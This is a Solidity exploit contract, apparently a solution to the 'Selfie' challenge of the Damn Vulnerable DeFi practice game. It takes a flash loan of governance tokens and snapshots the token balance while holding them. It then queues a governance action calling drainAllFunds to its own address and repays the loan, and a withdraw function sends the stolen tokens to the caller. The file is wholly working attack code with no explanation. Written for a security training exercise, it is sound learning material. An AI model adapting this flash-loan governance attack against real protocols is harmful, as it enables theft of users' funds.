import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

import "hardhat/console.sol";

contract SelfiePoolExp{
    
    DamnValuableTokenSnapshot token;
    SimpleGovernance gover;
    SelfiePool pool;

    event actionQueued(uint indexed actionId);

    constructor(address _token,address _governance, address _pool) {
        token = DamnValuableTokenSnapshot(_token);
        gover = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }


    function initFlashLoan(uint amount) external{
        pool.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        token.snapshot();
        uint actionId = gover.queueAction(address(pool), data, 0);
        token.transfer(address(pool), amount);
        emit actionQueued(actionId);
    }

    function withdraw() external {
        token.transfer(address(msg.sender), token.balanceOf(address(this)));
    }
}